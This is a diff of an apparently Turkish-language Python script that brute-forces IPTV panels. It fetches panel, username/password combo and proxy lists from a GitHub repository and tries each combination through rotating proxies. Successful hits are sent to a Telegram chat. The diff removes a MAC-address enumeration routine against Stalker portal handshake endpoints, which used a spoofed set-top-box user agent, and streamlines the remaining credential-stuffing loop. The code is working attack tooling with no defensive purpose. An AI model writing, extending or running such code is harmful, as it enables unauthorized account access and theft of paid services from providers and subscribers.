@@ -73,30 +73,7 @@ def m3u_tara(panel, user, pas, proxy_listesi):
         pass
     return False
 
-def mac_tara(panel, mac, proxy_listesi):
-    mac_url = f"http://{panel}/c/portal.imixs.com/stalker_portal/server/load.php?type=stb&action=handshake&mac={mac}"
-    headers = {'User-Agent': 'Mozilla/5.0 (QtEmbedded; U; Linux; C) AppleWebKit/533.3 (KHTML, like Gecko) MAG200 stbapp ver: 2 rev: 250 Safari/533.3'}
-    proxies = proxy_sec(proxy_listesi)
-    try:
-        if proxies:
-            res = requests.get(mac_url, headers=headers, timeout=3.5, verify=False, proxies=proxies)
-        else:
-            res = requests.get(mac_url, headers=headers, timeout=3.5, verify=False)
-            
-        if res.status_code == 200 and ('js' in res.text or 'token' in res.text):
-            mesaj = (
-                f"🔥 <b>MAC HİT BULUNDU!</b>\n"
-                f"🌐 <b>Panel:</b> http://{panel}\n"
-                f"🎯 <b>MAC:</b> <code>{mac}</code>"
-            )
-            telegrama_gonder(mesaj)
-            return True
-    except:
-        pass
-    return False
-
 def arka_plan_tarayici():
-    MAC_RAW_URL = "https://raw.githubusercontent.com/harnest/otonomtarayici-1/main/mac_list/MAC.txt"
     PANEL_RAW_URL = "https://raw.githubusercontent.com/harnest/otonomtarayici-1/main/panel_list/benzersiz_paneller.txt"
     COMBO_RAW_URL = "https://raw.githubusercontent.com/harnest/otonomtarayici-1/main/combo/userpass.txt"
     PROXY_RAW_URL = "https://raw.githubusercontent.com/harnest/otonomtarayici-1/main/proxy/proxy.txt"
@@ -108,14 +85,6 @@ def arka_plan_tarayici():
                 r_proxy = requests.get(PROXY_RAW_URL, timeout=5)
                 if r_proxy.status_code == 200:
                     proksiler = [p.strip() for p in r_proxy.text.splitlines() if p.strip()]
-            except:
-                pass
-
-            maclar = []
-            try:
-                r_mac = requests.get(MAC_RAW_URL, timeout=5)
-                if r_mac.status_code == 200:
-                    maclar = [m.strip() for m in r_mac.text.splitlines() if m.strip()]
             except:
                 pass
 
@@ -139,32 +108,18 @@ def arka_plan_tarayici():
             except:
                 pass
 
-            if not paneller and not maclar and not combolar:
-                telegrama_gonder("⚠️ <b>GitHub'dan veri okunamadı, liste boş!</b>")
+            if not paneller or not combolar:
+                telegrama_gonder("⚠️ <b>Panel veya Combo listesi boş, bekleniyor...</b>")
                 time.sleep(120)
                 continue
 
-            # MAC Tarama Kontrolü
-            if maclar and paneller:
-                telegrama_gonder("⏳ <b>MAC tarama başlatıldı</b>")
-                for panel in paneller:
-                    for mac in maclar:
-                        mac_tara(panel, mac, proksiler)
-                        time.sleep(0.05)
-                telegrama_gonder("✅ <b>MAC tarama bitti</b>")
-            else:
-                print("[i] MAC listesi veya Panel listesi boş olduğu için MAC taraması atlandı.")
-
-            # M3U Tarama Kontrolü
-            if combolar and paneller:
-                telegrama_gonder("⏳ <b>M3U tarama başlatıldı</b>")
-                for panel in paneller:
-                    for user, pas in combolar:
-                        m3u_tara(panel, user, pas, proksiler)
-                        time.sleep(0.05)
-                telegrama_gonder("✅ <b>M3U tarama bitti</b>")
-            else:
-                print("[i] Combo listesi veya Panel listesi boş olduğu için M3U taraması atlandı.")
+            # Direkt M3U Taraması
+            telegrama_gonder("⏳ <b>M3U tarama başlatıldı</b>")
+            for panel in paneller:
+                for user, pas in combolar:
+                    m3u_tara(panel, user, pas, proksiler)
+                    time.sleep(0.05)
+            telegrama_gonder("✅ <b>M3U tarama bitti</b>")
 
             time.sleep(300)
 
